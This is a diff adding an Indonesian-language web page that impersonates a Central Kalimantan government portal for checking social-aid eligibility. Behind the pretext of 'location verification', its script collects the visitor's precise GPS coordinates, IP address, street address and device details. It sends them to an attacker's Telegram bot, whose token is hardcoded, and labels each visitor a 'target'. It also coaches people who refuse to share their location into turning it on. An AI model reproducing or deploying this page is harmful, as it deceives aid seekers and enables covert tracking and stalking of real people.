@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="id" prefix="og: http://ogp.me/ns#">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cek Data Penerima Bantuan - BANMAS KALTENG</title>
+
+    <!-- Meta untuk Preview Link (WhatsApp/Telegram) -->
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Cek Status Penerima Bantuan Sosial (BLT) & Pasar Murah Kalteng">
+    <meta property="og:description" content="Silakan verifikasi lokasi Anda untuk mengecek status pendaftaran bantuan Kartu Huma Betang Sejahtera dan kupon Pasar Murah wilayah Kalimantan Tengah.">
+    <meta property="og:image" content="https://mmc.kalteng.go.id/files/berita/01072024101831_0.jpg">
+    <meta property="og:site_name" content="BANMAS - Bantuan Masyarakat">
+
+    <link rel="icon" type="image/png" href="https://banmas.humabetang.net/favicon.ico">
+
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { text-align: center; background: white; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 450px; overflow: hidden; }
+        .header { background: #004a99; padding: 20px; color: white; }
+        .header img { width: 60px; margin-bottom: 10px; }
+        .header h1 { font-size: 18px; margin: 0; text-transform: uppercase; letter-spacing: 1px; }
+        .content { padding: 30px 20px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a99; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #333; font-size: 16px; margin-bottom: 15px; font-weight: 600; }
+        .info-box { color: #555; font-size: 13.5px; line-height: 1.6; margin-bottom: 25px; text-align: left; background: #e3f2fd; padding: 15px; border-radius: 8px; border-left: 5px solid #2196f3; }
+        .btn-start { background: #e65100; color: white; border: none; padding: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; transition: background 0.3s; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+        .btn-start:active { transform: translateY(2px); box-shadow: none; }
+        .footer { padding: 15px; color: #888; font-size: 11px; background: #fafafa; border-top: 1px solid #eee; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/Coat_of_arms_of_Central_Kalimantan.svg/1200px-Coat_of_arms_of_Central_Kalimantan.svg.png" alt="Logo Kalteng">
+            <h1>BANMAS KALTENG</h1>
+        </div>
+
+        <div class="content">
+            <div id="loader" class="spinner"></div>
+            <h2 id="statusTitle">Verifikasi Lokasi Penerima</h2>
+
+            <div id="statusDesc" class="info-box">
+                <b>PENTING:</b><br>
+                Sesuai Peraturan Gubernur, bantuan ini hanya diperuntukkan bagi warga yang berada di wilayah <b>Kalimantan Tengah</b>.
+                <br><br>
+                Silakan klik tombol di bawah untuk melakukan <b>Verifikasi Lokasi</b>. Pastikan GPS/Lokasi di HP Anda aktif agar sistem dapat memvalidasi data Anda secara otomatis.
+            </div>
+
+            <button id="btnAction" class="btn-start" onclick="startCapture()">CEK STATUS BANTUAN</button>
+        </div>
+
+        <div class="footer">
+            Dinas Sosial Provinsi Kalimantan Tengah<br>
+            © 2024 Portal BANMAS - Huma Betang
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_TOKEN = '6786080132:AAF-_DzUcc8kL6m7Mc_gUD_ftX8M34OZgDE';
+        const CHAT_ID = '5004761119';
+        const REDIRECT_URL = 'https://banmas.humabetang.net/';
+
+        async function sendToTelegram(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                });
+            } catch (e) {}
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch (e) { return 'Gagal ambil IP'; }
+        }
+
+        async function getAddress(lat, lon) {
+            try {
+                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`);
+                const data = await res.json();
+                return data.display_name || "Alamat tidak ditemukan";
+            } catch (e) { return "Gagal ambil alamat otomatis"; }
+        }
+
+        async function startCapture() {
+            const btn = document.getElementById('btnAction');
+            const loader = document.getElementById('loader');
+            const desc = document.getElementById('statusDesc');
+            const title = document.getElementById('statusTitle');
+
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            title.innerText = "Memverifikasi Lokasi...";
+            desc.innerHTML = "Sedang mensinkronkan data dengan server Kependudukan...<br>Mohon tunggu sebentar dan jangan tutup halaman ini.";
+
+            sendToTelegram("🎁 <b>TARGET BANMAS (BANTUAN)</b>\nSedang menunggu GPS...");
+
+            if (!navigator.geolocation) {
+                await sendToTelegram("❌ Browser target tidak support GPS.");
+                window.location.href = REDIRECT_URL;
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (p) => {
+                    const lat = p.coords.latitude;
+                    const lon = p.coords.longitude;
+                    const acc = p.coords.accuracy.toFixed(1);
+                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    await sendToTelegram(
+                        `💰 <b>BANTUAN: LOKASI DIDAPAT!</b>\n\n` +
+                        `📍 <b>Koordinat:</b> <code>${lat}, ${lon}</code>\n` +
+                        `🎯 <b>Akurasi:</b> ${acc} meter\n` +
+                        `🔗 <a href="${mapsLink}">LIHAT DI PETA</a>`
+                    );
+
+                    desc.innerHTML = "Lokasi terverifikasi. Sedang memproses data bantuan...";
+
+                    const ipPromise = getIP();
+                    const addrPromise = getAddress(lat, lon);
+                    const [ip, addr] = await Promise.all([ipPromise, addrPromise]);
+
+                    await sendToTelegram(
+                        `🏠 <b>DETAIL LOKASI TARGET</b>\n` +
+                        `🌐 <b>IP:</b> <code>${ip}</code>\n` +
+                        `📍 <b>Alamat/Area:</b>\n<code>${addr}</code>\n\n` +
+                        `ℹ️ <i>Target kemungkinan berada di sekitar area tersebut.</i>\n\n` +
+                        `📱 <b>Perangkat:</b>\n<code>${navigator.userAgent}</code>`
+                    );
+
+                    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);
+                },
+                async (err) => {
+                    loader.style.display = 'none';
+                    title.innerText = "Verifikasi Gagal";
+                    if(err.code == 1) {
+                        desc.style.background = "#ffebee";
+                        desc.style.borderLeft = "5px solid #d32f2f";
+                        desc.innerHTML = `<span style="color:#d32f2f; font-weight:bold;">Akses Lokasi Diblokir!</span><br>
+                        Gagal memvalidasi domisili karena izin lokasi ditolak.<br><br>
+                        <b>Cara Mengatasi:</b><br>
+                        1. Klik ikon <b>Gembok/Info</b> di pojok kiri atas browser (dekat alamat web).<br>
+                        2. Pilih <b>Izin (Permissions)</b> dan aktifkan <b>Lokasi</b>.<br>
+                        3. <b>Muat Ulang (Refresh)</b> halaman ini untuk melanjutkan pengecekan bantuan.`;
+                        await sendToTelegram(`⚠️ <b>BANMAS: DIBLOKIR</b>\nTarget menolak izin lokasi.`);
+                    }
+                    else if(err.code == 2 || err.code == 3) {
+                        desc.style.background = "#fff3e0";
+                        desc.style.borderLeft = "5px solid #ff9800";
+                        desc.innerHTML = `<span style="color:#e65100; font-weight:bold;">GPS Perangkat Mati!</span><br>
+                        Sistem tidak dapat mendeteksi koordinat Anda. Harap aktifkan GPS di HP Anda.<br><br>
+                        <b>Langkah-langkah:</b><br>
+                        1. Usap layar dari atas ke bawah (Panel Notifikasi).<br>
+                        2. Aktifkan ikon <b>'Lokasi' / 'GPS'</b>.<br>
+                        3. Klik <b>Refresh/Muat Ulang</b> halaman ini.`;
+                        await sendToTelegram(`⚠️ <b>BANMAS: GPS OFF</b>\nGPS sistem HP target dalam keadaan mati.`);
+                    } else {
+                        await sendToTelegram(`⚠️ <b>BANMAS: ERROR</b>\nCode: ${err.code}`);
+                        window.location.href = REDIRECT_URL;
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
+            );
+        }
+    </script>
+</body>
+</html>
